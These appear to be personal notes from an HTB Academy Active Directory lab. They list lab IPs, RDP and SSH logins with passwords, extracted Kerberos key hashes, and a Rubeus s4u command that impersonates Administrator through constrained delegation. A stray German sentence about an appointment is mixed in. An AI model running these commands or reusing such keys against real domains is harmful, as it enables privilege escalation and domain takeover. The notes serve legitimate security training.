- IPs
  - DC1: 172.16.18.3
  - DC2: 172.16.18.4
  - Server01: 172.16.18.10
  - PKI: 172.16.18.15
  - WS001: DHCP or 172.16.18.25 (depending on the section)
  - Kali Linux: DHCP or 172.16.18.20 (depending on the section)


- WS001
xfreerdp /v:$TARGET /u:eagle\\bob /p:Slavi123 +clipboard /dynamic-resolution /drive:linux,/home/kaliwork/workspace/hacklab/academy/Attackwindows 

xfreerdp /v:172.16.18.3 /u:htb-student /p:'HTB_@cademy_stdnt!'+clipboard /dynamic-resolution /drive:linux,/home/kaliwork/workspace/hacklab/academy/Attackwindows 

htb-student:HTB_@cademy_stdnt!

- Kali
ssh kali@$TARGET
xfreerdp /v:$TARGET /u:kali /p:kali +clipboard /dynamic-resolution /drive:linux,/home/kalilearn/workspace/hacklab/academy/Attackwindows 

- Moving files alternative
smbclient \\\\$TARGET \\Share -U eagle/administrator%Slavi123
put
get

webservice
http/DC1
FCDC65703DD2B0BD789977F1F3EEAECF

[*]       rc4_hmac             : FCDC65703DD2B0BD789977F1F3EEAECF
[*]       aes128_cts_hmac_sha1 : 89E50DBF46388A7DBDB3EAAE80C6030F
[*]       aes256_cts_hmac_sha1 : D7480FABB291BDAC59D66B97812C3382A02AB9895D1C1B95A1AF520BAE08488B
[*]       des_cbc_md5          : 3D62D0CBEFB6D39B

.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /mdsspn:"http/dc1" /dc:dc1.eagle.local

```
Ich habe einen Termin für den 4.12.2024, aber da ich schon alle Unterlagen habe, versuche ich einen früheren zu bekommen. Falls ich einen früheren Termin bekommen, werde ich den für Dezember stornieren.
```


   

.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /mdsspn:"http/dc1" /dc:dc1.eagle.local
